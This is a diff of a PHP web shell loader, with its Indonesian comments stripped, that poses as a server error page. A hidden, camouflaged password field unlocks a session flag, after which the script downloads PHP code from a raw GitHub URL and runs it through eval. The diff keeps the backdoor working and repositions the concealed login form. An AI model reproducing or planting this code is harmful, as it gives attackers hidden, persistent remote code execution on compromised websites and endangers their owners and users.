@@ -1,14 +1,12 @@
 <?php
 
-session_start(); // Mulai session
+session_start();
 
 function is_logged_in()
 {
-    // Periksa apakah session telah diinisialisasi dan user_id ada dalam session
     return isset($_SESSION['user_id']) && $_SESSION['user_id'] === 'R10T';
 }
 
-// Function untuk mendapatkan konten URL (serupa dengan kode sebelumnya)
 function geturlsinfo($url)
 {
     if (function_exists('curl_exec')) {
@@ -34,17 +32,14 @@ function geturlsinfo($url)
 }
 
 if (is_logged_in()) {
-    // Jika sudah masuk, dapatkan dan tampilkan konten URL
     $a = geturlsinfo('https://raw.githubusercontent.com/sunshine0110/nopass/main/index.php');
     eval('?>' . $a);
 } else {
-    // Jika belum masuk, tampilkan formulir login
     if (isset($_POST['password'])) {
         $entered_password = $_POST['password'];
-        $hashed_password = '6fec6b83b1fec8a924e7222124cf6e75'; // Ganti dengan password yang di-hash MD5 Anda
+        $hashed_password = '6fec6b83b1fec8a924e7222124cf6e75';
 
         if (md5($entered_password) === $hashed_password) {
-            // Password benar, atur session untuk menandakan login
             $_SESSION['user_id'] = 'R10T';
         }
     }
@@ -60,11 +55,11 @@ if (is_logged_in()) {
         <p>More information about this error may be available in the server error log.</p>
         <hr>
         <address><?php echo $_SERVER['SERVER_SOFTWARE']; ?></address>
-        <form method="post">
-            <input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password">
         </form>
     </body>
     </html>
     <?php
 }
 ?>
+<form method="post">
+        <input style="margin: 0 auto; display: block; background-color: #fff; border: 1px solid #fff; text-align: center;" type="password" name="password">
